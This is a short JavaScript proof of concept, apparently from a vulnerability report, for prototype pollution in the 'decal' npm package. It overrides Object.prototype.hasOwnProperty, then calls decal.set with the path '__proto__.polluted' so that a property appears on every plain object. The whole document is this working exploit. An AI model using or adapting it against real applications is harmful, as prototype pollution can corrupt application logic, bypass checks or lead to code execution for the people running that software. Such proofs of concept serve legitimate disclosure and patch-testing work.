Object.prototype.hasOwnProperty = () => true;
const decal = require('decal');
console.log({}.polluted);
decal.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);